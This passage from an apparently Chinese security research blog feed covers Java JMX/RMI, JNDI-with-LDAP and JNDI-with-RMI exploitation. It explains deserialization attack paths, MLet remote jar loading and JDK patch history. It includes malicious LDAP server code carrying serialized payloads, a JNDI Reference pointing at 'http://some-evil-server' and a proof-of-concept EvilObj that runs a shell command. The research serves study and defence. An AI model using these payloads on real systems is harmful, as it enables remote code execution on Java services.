由于JMX认证时传递的是HashMap数据结构，而以HashMap可以直接构造一个反序列化利用链来攻击本地ClassPath，这里已经修复了不细讲了XD</p><p><strong>主动攻击1</strong>：利用RMI Registy收到远程bind时产生的反序列化漏洞 jdk&lt;8u141_b10(并且check host的顺序变了，详细可以看<a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">这里</a>)，<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/c92d704420d7#l2.32" target="_blank" rel="noopener">8u141_b10修改后</a>SingleEntryRegistry增加了filter</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306170312638-4519092.png" alt="image-20200306170312638"></p><p>限制了接受到的不能是序列化后的对象，也就意味着不能利用registry这种方式来达成利用了。</p><p><strong>主动攻击2</strong>:利用RMI DGC实现存在反序列化漏洞，可在JEP 290之前的版本攻击成功(使用ysoserial的JRMPClient，分析也见<a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">这里</a>0x08部分)</p><p>前面两种方式，在最新版的JDK8中均早已失效。除了直接攻击RMI层，我们也还可以利用MBean Server挂载的对象函数，来传递构造好的序列化数据。这里有点像RMI中利用RMI Server挂载的对象函数参数中存在相关可利用的对象，如Object类型就可以装载所有的序列化数据。</p><h3 id="2-攻击存在函数参数的对象"><a href="#2-攻击存在函数参数的对象" class="headerlink" title="2. 攻击存在函数参数的对象"></a>2. 攻击存在函数参数的对象</h3><p>利用MBean Server挂载的对象函数参数，来传递构造好的序列化数据。MBean Server接收到数据后，会对获取到的参数数据进行<code>object[]</code>转换，在转换前，需要将RMI交互过程中的序列化数据进行反序列化</p><p><code>javax/management/remote/rmi/RMIConnectionImpl.java#unwrap</code></p><p><img src="/images/java-jmx-rmi-20200310/image-20200306212145063-4519092.png" alt="image-20200306212145063"></p><p>1583行进行类型转化，但首先需要先进行反序列化<code>mo.get()</code></p><p><code>java/rmi/MarshalledObject.java#get</code></p><p><img src="/images/java-jmx-rmi-20200310/image-20200306212242480-4519092.png" alt="image-20200306212242480"></p><p>这里就到了常规的反序列化操作</p><p>所以只要MBean Server里存在MBean的函数存在参数，我们通过构造相关的invoke传递过去就可以触发反序列化</p><p><img src="/images/java-jmx-rmi-20200310/image-20200306212452672-4519092.png" alt="image-20200306212452672"></p><p>如<code>java.util.logging.Logging#getLoggerLevel(String)</code>有一个String类型的函数参数，这里我们直接将payload塞进invoke的第二个参数即可。</p><p>其他的MBean也同样可以这样操作，这里如果需要认证的话，就需要在连接时将认证信息带上，后续的还是可以利用成功的。</p><h3 id="3-利用MLET方式动态加载MBean"><a href="#3-利用MLET方式动态加载MBean" class="headerlink" title="3. 利用MLET方式动态加载MBean"></a>3. 利用MLET方式动态加载MBean</h3><p>这里先说利用方式：</p><p><strong>利用条件</strong>：</p><ol><li>无security manager</li><li>无认证</li></ol><p><strong>利用原理</strong>：</p><ol><li>在一HTTP Server挂载mlet文件和包含MBean的jar文件</li><li>用<code>createMBean(&quot;javax.management.loading.MLet&quot;, null);</code>的方式在远程JMX创建MLet对象</li><li>使用<code>getMBeansFromURL</code>从远程HTTP Server加载mlet文件</li><li>解析mlet文件，由于存在codebase，从远程加载jar文件，并载入该MBean</li><li>调用该MBean的方法，这个方法可以是自定义的执行命令等操作</li></ol><p><strong>简单分析</strong>：</p><p>来简单说一下MLet的原理，JMX除了加载本地的MBean，也可以加载远程的MLet文件(包含了MLet标签)来动态加载codebase里的Jar文件。后者就是通过MLet对象的getMBeansFromURL函数来完成的。</p><p>有兴趣的可以翻一翻<code>javax/management/loading/MLet.java#getMBeansFromURL</code>，这里直接说一下流程</p><ol><li><p>从远程服务器加载MLet文件并解析该文件</p></li><li><p>根据MLet文件中指定的codebase和archive字段，拼接成最后要请求的jar文件URL地址</p></li><li>最后由URLClassLoader来完成请求载入操作</li></ol><p>这里需要注意的是，第2步中，如果当前的URL地址已经存在将不再重新发起载入请求，意味着一次载入成功之后，我们就可以直接调用该MBean（Server不重启的状态下）。</p><p>而对于前面提到的两个利用条件：</p><p>在文档里<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html提到" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html提到</a></p><blockquote><p><strong>Caution -</strong> This configuration is insecure: any remote user who knows (or guesses) your port number and host name will be able to monitor and control your Java applications and platform. Furthermore, possible harm is not limited to the operations you define in your MBeans. A remote client could create a <code>javax.management.loading.MLet</code> MBean and use it to create new MBeans from arbitrary URLs, at least if there is <strong>no security manager</strong>. In other words, a rogue remote client could make your Java application execute arbitrary code.</p><p>Consequently, while disabling security might be acceptable for development, it is strongly recommended that you <strong>do not disable security for production systems</strong>.</p></blockquote><p>首先对于有认证的情况下，调用MLet将会进行权当前用户的权限验证，默认情况下都是不允许的。</p><p><code>com/sun/jmx/remote/security/MBeanServerFileAccessController.java#checkAccess</code>会检查当前登陆的用户是否有Create的权限(这里的权限是下面的createPatterns，它允许创建指定正则的类型，而我们默认是为空的)，这里默认会返回false，也就意味着它不允许以MLet对象创建新的MBean</p><p><img src="/images/java-jmx-rmi-20200310/image-20200318153641087.png" alt="image-20200318153641087"></p><p>其次对于security manager的限制，在远程载入前会判断是否存在载入的权限（这里我没看到其他的地方做了判断，可能不止当前这个位置的验证）</p><p><img src="/images/java-jmx-rmi-20200310/image-20200318155835634.png" alt="image-20200318155835634"></p><p>当前方法比较方便的是可以载入任意的代码来执行，但是利用条件比较苛刻。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>对于JMX的利用主要利用的是本地存在的Gadget，如果本地不存在Gadget的话就无法利用成功。除非满足JMX MLet的利用条件，通过加载codebase上的Jar文件来执行任意代码。</p><p>除此之外，由于本身JMX用的RMI那一套东西，所以如果在合适的JDK版本下，我们可以直接攻击RMI，不过前提仍然是本地存在相关的利用链。</p><p>最后，前文提到的攻击方法我已经同步到<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">github</a>上了</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI with LDAP</title>
      <link href="2020/03/01/java/jndi-with-ldap/"/>
      <url>2020/03/01/java/jndi-with-ldap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>JNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager，本文将讲述JNDI使用ldap协议的两个攻击面XD</p><a id="more"></a><h2 id="0x01-LDAP基础"><a href="#0x01-LDAP基础" class="headerlink" title="0x01 LDAP基础"></a>0x01 LDAP基础</h2><p>关于LDAP的介绍，延伸阅读一下<a href="https://www.cnblogs.com/wilburxu/p/9174353.html" target="_blank" rel="noopener">这篇</a></p><blockquote><p>LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory:</p><p>● Using Java serialization<br>        o <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html</a><br>● Using JNDI References<br>        o <a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</a></p><p>from <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p></blockquote><p>Java中的LDAP可以在属性值中存储相关的Java对象，可以存储如上两种对象，而相关的问题就是出现在这部分上。</p><p>后文用的LDAP Server参考的是<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener">mbechler 实现的LDAPRefServer</a>，连接的客户端Client直接用JNDI的lookup完成，jdk版本jdk8u162</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"ldap://127.0.0.1:1389/EvilObj"</span>);</span><br><span class="line">ctx.close();</span><br></pre></td></tr></table></figure><h2 id="0x02-LDAP-with-JDNI-References"><a href="#0x02-LDAP-with-JDNI-References" class="headerlink" title="0x02 LDAP with JDNI References"></a>0x02 LDAP with JDNI References</h2><p>JNDI发起ldap的lookup后，将有如下的调用流程，这里我们直接来关注，获得远程LDAP Server的Entry之后，Client这边是怎么做处理的</p><p><img src="/images/jndi-with-ldap-20200301/image-20200301142213589.png" alt="image-20200301142213589"></p><p>跟进com/sun/jndi/ldap/Obj.java#decodeObject，按照该函数的注释来看，其主要功能是解码从LDAP Server来的对象，该对象可能是序列化的对象，也可能是一个Reference对象。关于序列化对象的处理，我们看后面一节。这里摘取了Reference的处理方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Object <span class="title">decodeObject</span><span class="params">(Attributes attrs)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    Attribute attr;</span><br><span class="line">    <span class="comment">// Get codebase, which is used in all 3 cases.</span></span><br><span class="line">    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);<span class="comment">// "objectClass"</span></span><br><span class="line">        <span class="keyword">if</span> (attr != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || <span class="comment">// "javaNamingReference"</span></span><br><span class="line">                attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; <span class="comment">// "javanamingreference"</span></span><br><span class="line">            <span class="keyword">return</span> decodeReference(attrs, codebases);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>如果LDAP Server返回的属性里包括了<code>objectClass</code>和<code>javaNamingReference</code>，将进入Reference的处理函数decodeReference上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    className = (String)attr.get();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] +</span><br><span class="line">                <span class="string">" attribute is required"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    factory = (String)attr.get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Reference ref = <span class="keyword">new</span> Reference(className, factory,</span><br><span class="line">    (codebases != <span class="keyword">null</span>? codebases[<span class="number">0</span>] : <span class="keyword">null</span>));</span><br></pre></td></tr></table></figure><p>decodeReference再从属性中提取出<code>javaClassName</code>和<code>javaFactory</code>，最后将生成一个Reference。这里如果看过我前面的那篇<a href="http://blog.0kami.cn/2020/02/09/jndi-with-rmi/">jndi-with-rmi</a>，可以看到其实这里生成的ref就是我们在RMI返回的那个ReferenceWrapper，后面这个ref将会传递给Naming Manager去处理，包括从codebase中获取class文件并载入。</p><p>而这里LDAP也类似，处理ref的对象是NamingManager的子类javax/naming/spi/DirectoryManager.java，因为跟RMI有点类似不具体分析了，最后同样由javax/naming/spi/NamingManager.java#getObjectFactoryFromReference来处理。</p><p>到这里，我们再来看mbechler 实现的LDAPRefServer就比较清楚了</p><p><img src="/images/jndi-with-ldap-20200301/image-20200301144715061.png" alt="image-20200301144715061"></p><p>当其获取到LDAP连接时，将填充如上的几个属性及其对应的值，就是为了满足上面的条件而生成一个Reference对象。</p><h2 id="0x03-LDAP-with-Serialized-Object"><a href="#0x03-LDAP-with-Serialized-Object" class="headerlink" title="0x03 LDAP with Serialized Object"></a>0x03 LDAP with Serialized Object</h2><p>JNDI对于属性中的序列化数据的处理一共有两个地方，我们先来顺着前面的JNDI Reference的思路说下去</p><h4 id="第一处：com-sun-jndi-ldap-Obj-java-decodeObject"><a href="#第一处：com-sun-jndi-ldap-Obj-java-decodeObject" class="headerlink" title="第一处：com/sun/jndi/ldap/Obj.java#decodeObject"></a>第一处：com/sun/jndi/ldap/Obj.java#decodeObject</h4><p>在com/sun/jndi/ldap/Obj.java#decodeObject上还存在一个判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != <span class="keyword">null</span>) &#123;<span class="comment">// “javaSerializedData”</span></span><br><span class="line">    ClassLoader cl = helper.getURLClassLoader(codebases);</span><br><span class="line">    <span class="keyword">return</span> deserializeObject((<span class="keyword">byte</span>[])attr.get(), cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果在返回的属性中存在<code>javaSerializedData</code>，将继续调用<code>deserializeObject</code>函数，该函数主要就是调用常规的反序列化方式readObject对序列化数据进行还原，如下payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAttribute</span><span class="params">(Entry entry)</span></span>&#123;</span><br><span class="line">  entry.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">  entry.addAttribute(<span class="string">"javaSerializedData"</span>, serialized);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们就不需要通过远程codebase的方式来达成RCE，当然首先本地环境上需要有反序列化利用链所依赖的库文件。</p><h4 id="第二处：com-sun-jndi-ldap-Obj-java-decodeReference"><a href="#第二处：com-sun-jndi-ldap-Obj-java-decodeReference" class="headerlink" title="第二处：com/sun/jndi/ldap/Obj.java#decodeReference"></a>第二处：com/sun/jndi/ldap/Obj.java#decodeReference</h4><p><code>decodeReference</code>函数在对普通的Reference还原的基础上，还可以进一步对RefAddress做还原处理，其中还原过程中，也调用了<code>deserializeObject</code>函数，这意味着我们通过满足RefAddress的方式，也可以达到上面第一种的效果。</p><p>具体代码太长了，这里我就说一下条件：</p><ol><li>第一个字符为分隔符</li><li>第一个分隔符与第二个分隔符之间，表示Reference的position，为int类型</li><li>第二个分隔符与第三个分隔符之间，表示type，类型</li><li>第三个分隔符是双分隔符的形式，则进入反序列化的操作</li><li>序列化数据用base64编码</li></ol><p>满足上面的条件，构造一个类似的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processAttribute</span><span class="params">(Entry entry)</span></span>&#123;</span><br><span class="line">  entry.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"foo"</span>);</span><br><span class="line">  entry.addAttribute(<span class="string">"javaReferenceAddress"</span>,<span class="string">"$1$String$$"</span>+<span class="keyword">new</span> BASE64Encoder().encode(serialized));</span><br><span class="line">  entry.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然第二处只是一个锦上添花的步骤，我们可以直接用第一种方法，第二种在第一种不能用的情况下可以试试。</p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>自<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33" target="_blank" rel="noopener">jdk8u191-b02</a>版本后，新添加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>默认为false的限制，也就意味着远程codebase的Reference方式被限制死了，我们只能通过SerializedData的方法来达成利用。</p><p>我们来整理一下，关于jndi的相关安全更新</p><ul><li><p>JDK 6u132, JDK 7u122, JDK 8u113中添加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false。</p><p><strong>导致jndi的rmi reference方式失效，但ldap的reference方式仍然可行</strong></p></li><li><p>Oracle JDK 11.0.1、8u191、7u201、6u211之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被调整为false。</p><p><strong>导致jndi的ldap reference方式失效，到这里为止，远程codebase的方式基本失效，除非认为设为true</strong></p></li></ul><p>而在最新版的jdk8u上，jndi ldap的本地反序列化利用链<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l239" target="_blank" rel="noopener">1</a>和<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/com/sun/jndi/ldap/Obj.java#l478" target="_blank" rel="noopener">2</a>的方式仍然未失效，jndi rmi底层(JRMPListener)<a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/b959971e0a5a/src/share/classes/sun/rmi/transport/StreamRemoteCall.java#l270" target="_blank" rel="noopener">StreamRemoteCall</a>的本地利用方式仍未失效。</p><p>所以如果Reference的方式不行的时候，可以试试利用本地ClassPath里的反序列化利用链来达成RCE。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>JNDI和LDAP的结合，出现了2种利用方式，一是利用远程codebase的方式，二是利用本地ClassPath里的反序列化利用链。在最新版的jdk8u中，codebase的方式依赖<code>com.sun.jndi.ldap.object.trustURLCodebase</code>的值，而第二种方式仍未失效。</p><p>LDAP的使用方法除了JNDI的lookup，其他的库也会有相应的使用方法，如Spring的ldap，这里还可以继续深入下去，先挖个坑XD</p><p>最后，上面的两个ldap Server更新到了<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">github</a>上，自取XD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI with RMI</title>
      <link href="2020/02/09/java/jndi-with-rmi/"/>
      <url>2020/02/09/java/jndi-with-rmi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在现实环境中，遇到RMI Registry的机会很少，而结合反序列化漏洞的JNDI注入则常见了许多。本文将介绍RMI结合JNDI后可以做哪些事情XD</p><a id="more"></a><h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><p>在看JNDI同RMI的利用前，我们先来看看关于RMI动态类加载的概念。</p><h3 id="RMI动态类加载"><a href="#RMI动态类加载" class="headerlink" title="RMI动态类加载"></a>RMI动态类加载</h3><p>RMI有一个重要的特性是动态类加载机制，当本地CLASSPATH中无法找到相应的类时，会在指定的codebase里加载class。codebase可以在系统属性java.rmi.server.codebase设置其URL。如果codebase的URL可控，那么我们就可以载入任意的class或jar文件。根据P牛的Java安全漫谈- RMI篇中提到，通过修改传递过程中的序列化数据，将其中的codebase修改为恶意的server，这样可以达到RMI Server端被攻击的效果。不过，这个利用条件比较苛刻，并且oracle在后面对其做了限制，如果要成功利用需要满足如下要求：</p><blockquote><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21，6u45或者设置了<code>java.rmi.server.useCodebaseonly=false</code></li></ul><p>摘自Java安全漫谈-RMI篇</p></blockquote><p>其中上面的配置，在7u21，6u45后的版本里默认为<code>true</code>，那么也就无法从远程codebase中载入类，避免了上面说的这种攻击的可能性。</p><h3 id="JNDI的相关概念"><a href="#JNDI的相关概念" class="headerlink" title="JNDI的相关概念"></a>JNDI的相关概念</h3><blockquote><p>Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name.</p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p></blockquote><p>JNDI方便了与naming service和Directory service的交互，通过指定特定的URL即可与不同的服务进行交互。相当于对这些服务的API又进行了一次封装供开发人员使用。其中JNDI中也存在上述RMI codebase的动态加载机制，并且其配置同底层的RMI配置并不相关。</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204162708130-1255889.png" alt="image-20200204162708130"></p><p>从上述的构架来看，动态加载发生于两个部分，Naming Manager和JNDI SPI。这里SPI部分就是相对应的服务的配置，比如前文提到的RMI的限制就是SPI部分的。而Naming Manager也存在一个动态加载机制并且其在修复前并无限制，这里Naming Manager部分用到的是JNDI的Naming References</p><blockquote><p>In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate.</p><p>For such needs, JNDI defined <strong>Naming References</strong> (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object.</p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p></blockquote><p>这里提到由于某些情况不能直接将远程obj返回，所以JNDI提出了Naming References的方法，返回相应的Reference而不返回具体的obj。统一由JNDI的请求端去加载指定的地址上的obj。这里加载方法中就包括远程codebase的方法，来看个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String FactoryURL = <span class="string">"http://some-evil-server"</span>;</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"MyClass"</span>,<span class="string">"MyClass"</span>,FactoryURL);</span><br><span class="line">ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">ctx.bind(<span class="string">"Foo"</span>, wrapper);<span class="comment">// 绑定reference</span></span><br></pre></td></tr></table></figure><p>请求端以lookup请求上述绑定的RMI服务即可。其处理过程引用<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></p><p><img src="/images/jndi-with-rmi-20200209/image-20200204164815153-1255889.png" alt="image-20200204164815153"></p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><h3 id="JNDI-with-RMI-DEMO"><a href="#JNDI-with-RMI-DEMO" class="headerlink" title="JNDI with RMI DEMO"></a>JNDI with RMI DEMO</h3><p>为了更好的说明，以下面的代码为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> train.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        String FactoryURL = <span class="string">"http://localhost/"</span>;</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"EvilObj"</span>,<span class="string">"EvilObj"</span>,FactoryURL);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Foo"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Server端以RMI Registry注册一个Reference，并将factoryURL指定为localhost</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> train.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="string">"rmi://localhost:1099/Foo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client端比较简单，直接以lookup指定的RMI URL即可。根据上面的过程图，我们可以知道的是最终执行EvilObj的地方是Client端(jndi发起lookup的方法)。最后我们创一个EvilObj</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObj</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"open /System/Applications/Calculator.app"</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">    &#125;</span><br><span 